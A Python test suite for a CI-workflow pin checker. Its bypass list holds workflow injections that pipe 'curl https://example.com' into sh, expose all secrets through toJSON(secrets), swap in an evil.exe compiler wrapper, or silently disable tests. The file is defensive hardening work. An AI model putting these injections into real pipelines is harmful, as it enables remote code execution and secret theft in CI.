"""Tests for scripts/check_ci_workflow.py: the workflow must equal the approved copy (CRLF -> LF only), and the approved
copy must pass its own self-test. CLI tests write sample files under the scratch folder that broadsword.toml names
(scratch_dir), removed afterwards.

  python -I -B scripts/test_check_ci_workflow.py -v

BYPASSES is every workflow the review rounds showed passing an earlier (YAML-parsing) checker; each must fail here.
"""
import sys

sys.dont_write_bytecode = True

import contextlib
import importlib.util
import io
import pathlib
import shutil
import tomllib
import unittest
import uuid

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent
SCRIPT = HERE / "check_ci_workflow.py"

spec = importlib.util.spec_from_file_location("check_ci_workflow", SCRIPT)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"

DOC = f"""# Node 0.1

- ci-triggers: push, pull_request
- ci-runner: windows-latest
- ci-build: cargo build --locked -p broadsword
- ci-test: cargo test --locked -p broadsword
- ci-checkout: actions/checkout@{SHA}
"""

# An independent copy of the approved workflow (written here, not taken from the module).
GOOD = f"""# CI for the Broadsword crate (roadmap node 0.1). scripts/check_ci_workflow.py checks this file against docs/nodes/0.1.md.
# No secrets, no deploy steps; the only third-party action is actions/checkout, pinned to a full commit SHA.
name: ci

on:
  push:
  pull_request:

permissions:
  contents: read

jobs:
  build-test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@{SHA} # v4.2.2
      - name: Build
        run: cargo build --locked -p broadsword
      - name: Test
        run: cargo test --locked -p broadsword
"""

TEST_STEP = "      - name: Test\n        run: cargo test --locked -p broadsword\n"
RUN_TEST = "run: cargo test --locked -p broadsword"

# (review that found it, what it does, the workflow text). Each passed some earlier checker; see the brief's redesign.
BYPASSES = [
    ("r1 q-20261120-015921", "flow-style push limited to main", GOOD.replace("  push:\n", "  push: {branches: [main]}\n")),
    ("r1 q-20261120-015921", "flow-style push limited by tags", GOOD.replace("  push:\n", "  push: { tags: ['v*'] }\n")),
    ("r1 q-20261120-015921", "flow-style third-party step", GOOD + "      - {uses: some/action@v1}\n"),
    ("r1 q-20261120-015921", "flow-style extra run step", GOOD + "      - {run: curl https://example.com | sh}\n"),
    ("r2 q-20261120-053807-3", "space before colon in uses", GOOD + "      - uses : some/action@v1\n"),
    ("r2 q-20261120-053807-3", "space before colon in run", GOOD + "      - run : curl https://example.com | sh\n"),
    ("r2 q-20261120-053807-3", "toJSON(secrets) without `secrets.`", GOOD + "        env:\n          K: ${{ toJSON(secrets) }}\n"),
    ("r2 q-20261120-053807-3", "explicit-key run", GOOD + "      - ? run\n        : curl https://example.com | sh\n"),
    ("r2 q-20261120-053807-3", "tagged run key", GOOD + "      - !!str run: curl https://example.com | sh\n"),
    ("r3 q-20261120-054509", "quoted run continues onto next line",
     GOOD.replace(RUN_TEST, 'run: "cargo test --locked -p broadsword\n          zz: x"')),
    ("r3 q-20261120-054509", "quoted run continuation runs a command",
     GOOD.replace(RUN_TEST, 'run: "cargo test --locked -p broadsword\n          ok: ; curl https://example.com | sh"')),
    ("r3 q-20261120-054509", "custom shell template", GOOD + "        shell: bash -c 'curl https://example.com | sh; {0}'\n"),
    ("r3 q-20261120-054509", "env RUSTC_WRAPPER", GOOD + "        env:\n          RUSTC_WRAPPER: evil.exe\n"),
    ("r3 q-20261120-054509", "working-directory", GOOD + "        working-directory: elsewhere\n"),
    ("r3 q-20261120-054509", "job container",
     GOOD.replace("    runs-on: windows-latest\n", "    runs-on: windows-latest\n    container: some/image\n")),
    ("r4 q-20261120-063309", "block-scalar name, run continuation folds in a curl",
     GOOD.replace(TEST_STEP, "      - name: |\n          Test\n        run: cargo test --locked -p broadsword\n"
                             "          ; curl https://example.com/x | sh\n")),
    ("r4 q-20261120-063309", "pull_request types: closed",
     GOOD.replace("  pull_request:\n", "  pull_request:\n    types:\n      - closed\n")),
    ("r4 q-20261120-063309", "job if: false", GOOD.replace("    runs-on:", "    if: false\n    runs-on:")),
    ("r4 q-20261120-063309", "continue-on-error on the test step", GOOD + "        continue-on-error: true\n"),
    ("r4 q-20261120-063309", "nested `- - run:` item", GOOD + "      - - run: curl https://example.com | sh\n"),
]


def b(text):
    return text.encode("utf-8")


def scratch_dir():
    with open(ROOT / "broadsword.toml", "rb") as f:
        return ROOT / tomllib.load(f)["scratch_dir"]


class Pin(unittest.TestCase):
    def test_identical_file_passes(self):
        self.assertEqual(mod.check(b(GOOD)), [])

    def test_module_pin_equals_independent_copy(self):
        self.assertEqual(mod.APPROVED, GOOD)

    def test_crlf_only_difference_passes(self):
        self.assertEqual(mod.check(b(GOOD.replace("\n", "\r\n"))), [])

    def test_mixed_crlf_and_lf_passes(self):
        lines = GOOD.splitlines(keepends=True)
        mixed = "".join(l.replace("\n", "\r\n") if i % 2 else l for i, l in enumerate(lines))
        self.assertIn("\r\n", mixed)
        self.assertEqual(mod.check(b(mixed)), [])

    def test_one_byte_change_fails(self):
        p = mod.check(b(GOOD.replace("windows-latest", "windows-latesu")))
        self.assertIn(mod.CHANGED, p)

    def test_every_single_byte_change_fails(self):
        base = b(GOOD)
        for i in range(len(base)):
            changed = bytearray(base)
            changed[i] ^= 1
            self.assertNotEqual(mod.check(bytes(changed)), [], f"byte {i} flipped still passes")

    def test_every_single_byte_deletion_fails(self):
        base = b(GOOD)
        for i in range(len(base)):
            self.assertNotEqual(mod.check(base[:i] + base[i + 1:]), [], f"byte {i} deleted still passes")

    def test_only_crlf_is_normalised(self):
        for name, data in [("lone CR", b(GOOD.replace("\n", "\r", 1))), ("BOM", b"\xef\xbb\xbf" + b(GOOD)),
                           ("no final newline", b(GOOD[:-1])), ("trailing space", b(GOOD.replace("ci\n", "ci \n", 1))),
                           ("tab", b(GOOD.replace("  push:", "\tpush:"))), ("extra blank line", b(GOOD + "\n")),
                           ("CR CR LF", b(GOOD.replace("\n", "\r\r\n", 1))), ("not UTF-8", b(GOOD) + b"\xff")]:
            self.assertIn(mod.CHANGED, mod.check(data), name)

    def test_failure_prints_a_unified_diff(self):
        p = mod.check(b(GOOD.replace("windows-latest", "ubuntu-latest")))
        self.assertTrue(any(x.startswith("--- approved") for x in p), p)
        self.assertTrue(any(x.startswith("+++ .github/workflows/ci.yml") for x in p), p)
        self.assertIn("-    runs-on: windows-latest", p)
        self.assertIn("+    runs-on: ubuntu-latest", p)
        self.assertEqual(p[-1], "ci.yml changed: review the diff, then update the approved copy in the same commit")


class Bypasses(unittest.TestCase):
    def test_every_earlier_bypass_fails(self):
        self.assertEqual(len(BYPASSES), 20)
        for review, what, text in BYPASSES:
            with self.subTest(review=review, what=what):
                self.assertNotEqual(text, GOOD)
                self.assertIn(mod.CHANGED, mod.check(b(text)))
                self.assertIn(mod.CHANGED, mod.check(b(text.replace("\n", "\r\n"))))


class SelfTest(unittest.TestCase):
    """pin_problems() on the approved copy, and on planted bad copies (so changing the pin stays deliberate)."""

    def contract(self, doc=DOC):
        return mod.read_contract(doc)

    def test_approved_copy_passes_its_self_test(self):
        self.assertEqual(mod.pin_problems(mod.APPROVED, self.contract()), [])

    def test_every_bypass_as_approved_copy_fails_the_self_test(self):
        for review, what, text in BYPASSES:
            with self.subTest(review=review, what=what):
                self.assertNotEqual(mod.pin_problems(text, self.contract()), [])

    def planted(self, text, word):
        p = mod.pin_problems(text, self.contract())
        self.assertTrue(any(word in x for x in p), p)

    def test_planted_extra_trigger(self):
        self.planted(GOOD.replace("  pull_request:\n", "  pull_request:\n  schedule:\n"), "triggers")

    def test_planted_missing_trigger(self):
        self.planted(GOOD.replace("  pull_request:\n", ""), "triggers")

    def test_planted_branch_filter(self):
        self.planted(GOOD.replace("  push:\n", "  push:\n    branches:\n      - main\n"), "triggers")

    def test_planted_runner(self):
        self.planted(GOOD.replace("windows-latest", "ubuntu-latest"), "runs-on")

    def test_planted_test_command(self):
        self.planted(GOOD.replace(RUN_TEST, "run: cargo test"), "cargo test --locked -p broadsword")

    def test_planted_extra_run(self):
        self.planted(GOOD + "      - run: echo hi\n", "`run:` other than")

    def test_planted_other_action(self):
        self.planted(GOOD + "      - uses: some/action@" + SHA + "\n", "the only `uses:`")

    def test_planted_unpinned_checkout(self):
        self.planted(GOOD.replace("@" + SHA, "@v4"), "the only `uses:`")

    def test_planted_forbidden_keys(self):
        for key in ("if: false", "continue-on-error: true", "shell: bash", "working-directory: x", "env:"):
            with self.subTest(key=key):
                self.planted(GOOD + f"        {key}\n", "contains")

    def test_doc_drift_fails_the_self_test(self):
        for key, value in [("runner", "macos-latest"), ("build", "cargo build"), ("test", "cargo test"),
                           ("triggers", "push"), ("checkout", "actions/checkout@v4")]:
            with self.subTest(key=key):
                doc = "\n".join(f"- ci-{key}: {value}" if l.startswith(f"- ci-{key}:") else l for l in DOC.splitlines())
                p = mod.pin_problems(mod.APPROVED, self.contract(doc))
                self.assertTrue(any(f"ci-{key}" in x for x in p), p)


class Cli(unittest.TestCase):
    def setUp(self):
        s = scratch_dir()
        s.mkdir(exist_ok=True)
        self.dir = s / f"ci-check-test-{uuid.uuid4().hex[:8]}"
        self.dir.mkdir()
        self.addCleanup(shutil.rmtree, self.dir, True)

    def run_main(self, workflow, doc):
        w, d = self.dir / "ci.yml", self.dir / "0.1.md"
        if workflow is not None:
            w.write_bytes(workflow)
        if doc is not None:
            d.write_text(doc, encoding="utf-8")
        old = sys.argv
        sys.argv = ["check_ci_workflow.py", "--workflow", str(w), "--doc", str(d)]
        out = io.StringIO()
        try:
            with contextlib.redirect_stdout(out):
                rc = mod.main()
        finally:
            sys.argv = old
        return rc, out.getvalue()

    def test_good_exits_0(self):
        self.assertEqual(self.run_main(b(GOOD), DOC), (0, "ci workflow: OK\n"))

    def test_good_crlf_exits_0(self):
        self.assertEqual(self.run_main(b(GOOD.replace("\n", "\r\n")), DOC)[0], 0)

    def test_bad_exits_1_with_diff_and_line(self):
        rc, out = self.run_main(b(GOOD.replace("windows-latest", "ubuntu-latest")), DOC)
        self.assertEqual(rc, 1)
        self.assertIn("+    runs-on: ubuntu-latest\n", out)
        self.assertIn("ci.yml changed: review the diff, then update the approved copy in the same commit\n", out)

    def test_doc_drift_exits_1(self):
        rc, out = self.run_main(b(GOOD), DOC.replace("windows-latest", "macos-latest"))
        self.assertEqual(rc, 1)
        self.assertIn("ci-runner", out)

    def test_missing_file_exits_2(self):
        self.assertEqual(self.run_main(None, DOC)[0], 2)

    def test_doc_without_contract_exits_2(self):
        self.assertEqual(self.run_main(b(GOOD), "# nothing\n")[0], 2)


class RealFiles(unittest.TestCase):
    def test_real_workflow_is_the_approved_copy(self):
        w = ROOT / ".github" / "workflows" / "ci.yml"
        d = ROOT / "docs" / "nodes" / "0.1.md"
        self.assertTrue(w.is_file() and d.is_file())
        self.assertEqual(mod.pin_problems(mod.APPROVED, mod.read_contract(d.read_text(encoding="utf-8"))), [])
        self.assertEqual(mod.check(w.read_bytes()), [])


if __name__ == "__main__":
    unittest.main()
